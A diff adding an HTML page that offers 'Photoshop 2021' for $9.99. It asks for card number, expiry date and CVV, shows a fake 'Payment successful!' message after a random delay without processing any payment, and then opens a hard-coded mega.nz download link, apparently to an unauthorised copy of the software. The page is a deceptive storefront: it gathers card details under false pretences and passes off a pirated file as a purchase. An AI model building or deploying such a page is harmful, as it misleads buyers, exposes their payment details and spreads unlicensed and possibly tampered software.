@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Purchase Photoshop 2021</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f2f2f2;
+      margin: 0;
+      padding: 20px;
+    }
+
+    h1 {
+      text-align: center;
+    }
+
+    form {
+      max-width: 400px;
+      margin: 20px auto;
+      padding: 20px;
+      background-color: #ffffff;
+      border-radius: 5px;
+      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+    }
+
+    label {
+      display: block;
+      margin-bottom: 5px;
+      font-weight: bold;
+    }
+
+    input[type="text"] {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 3px;
+      box-sizing: border-box;
+    }
+
+    .error-message {
+      color: red;
+      margin-top: 10px;
+    }
+
+    .success-message {
+      color: green;
+      margin-top: 10px;
+    }
+
+    .pay-button-container {
+      text-align: center;
+      margin-top: 20px;
+    }
+
+    .pay-button {
+      padding: 10px 20px;
+      background-color: #4CAF50;
+      color: #ffffff;
+      border: none;
+      border-radius: 3px;
+      cursor: pointer;
+    }
+
+    .pay-button:disabled {
+      background-color: #cccccc;
+      cursor: not-allowed;
+    }
+  </style>
+  <script type="text/javascript">
+    function purchaseProduct() {
+      // Get credit card details
+      var cardNumber = document.getElementById("cardNumber").value;
+      var expirationDate = document.getElementById("expirationDate").value;
+      var cvvCode = document.getElementById("cvvCode").value;
+
+      // Check if all fields are filled
+      if (cardNumber === "" || expirationDate === "" || cvvCode === "") {
+        var errorMessage = document.getElementById("errorMessage");
+        errorMessage.innerHTML = "Please fill in all fields.";
+        return;
+      }
+
+      // Hide any previous error messages
+      var errorMessage = document.getElementById("errorMessage");
+      errorMessage.innerHTML = "";
+
+      // Disable the Pay button to prevent multiple clicks
+      var payButton = document.getElementById("payButton");
+      payButton.disabled = true;
+
+      // Generate random delay between 1 and 10 seconds (in milliseconds)
+      var randomDelay = Math.floor(Math.random() * 10000) + 1000;
+
+      // Show success message after the random delay
+      setTimeout(function() {
+        // Display success message
+        var successMessage = document.getElementById("successMessage");
+        successMessage.innerHTML = "Payment successful! Loading your purchased file...";
+
+        // Open the URL in a new tab after a short delay
+        setTimeout(function() {
+          var url = "https://mega.nz/file/V6txkSRC#Z7N6cbuPMPf4TsKurQlUsWqJu5DY3Q6UrDbfXItPsUQ";
+          window.open(url, "_blank");
+        }, 1500); // Delay of 1.5 seconds before opening the URL
+      }, randomDelay);
+    }
+  </script>
+</head>
+<body>
+  <h1>Purchase Photoshop 2021</h1>
+  <p style="text-align: center; font-weight: bold;">Price: $9.99</p>
+  <form>
+    <!-- Product details and payment information fields go here -->
+    <label for="cardNumber">Card Number:</label>
+    <input type="text" id="cardNumber" required>
+
+    <label for="expirationDate">Expiration Date:</label>
+    <input type="text" id="expirationDate" required>
+
+    <label for="cvvCode">CVV Code:</label>
+    <input type="text" id="cvvCode" required>
+
+    <div class="pay-button-container">
+      <input type="button" id="payButton" class="pay-button" value="Pay" onclick="purchaseProduct()">
+    </div>
+    <p id="errorMessage" class="error-message"></p>
+  </form>
+  <p id="successMessage" class="success-message"></p>
+</body>
+</html>
